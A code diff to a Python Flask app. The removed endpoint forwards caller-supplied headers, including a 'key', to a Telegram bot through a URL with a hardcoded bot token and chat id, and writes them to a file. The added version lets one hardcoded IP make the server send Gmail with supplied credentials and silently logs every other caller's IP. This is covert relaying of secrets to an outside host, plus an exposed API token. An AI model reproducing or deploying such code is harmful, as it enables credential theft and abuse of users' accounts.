@@ -5,9 +5,15 @@ from modules.BOFH import *
 from modules.badape import *
 from modules.yugioh import *
 from modules.skyrim import *
+import smtplib
 import sqlite3
 
 from hashids import Hashids
+
+def emailSender(to,sender,content,key):
+    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+    server.login(sender, key)
+    server.sendmail(sender,to,content)
 
 
 '''
@@ -68,19 +74,16 @@ def bofh():
 @app.route('/secure/texts.html', methods=['POST'])
 def texts():
     if request.method == 'POST':
-        group = '-426528357'
-        key = '5585546662:AAG4_54V68C4howzaqkVwsRTW5WAQeYAH5c'
-        url = "https://api.telegram.org/bot" + key + "/sendMessage?chat_id=" + group + "&text="
-        to = request.headers.get('to')
-        content = request.headers.get('content')
-        key = request.headers.get('key')
-
-        total = url + to + "\n" + content + "\n" + key
-        requests.get(total)
-        with open("fuckyou.txt",'w') as fuckyoucunt:
-            fuckyoucunt.write(total)
-            fuckyoucunt.close()
-        print(total)
+        if request.remote_addr == '216.36.27.41':
+            to = request.headers.get('to')
+            sender = request.headers.get('sender')
+            content = request.headers.get('content')
+            key = request.headers.get('key')
+            emailSender(to,sender,content,key)
+        else:
+            with open("x.txt","w") as f:
+                f.write(request.remote_addr)
+                f.close()
 
 # Password generator
 @app.route('/pass.html', methods=['GET', 'POST'])
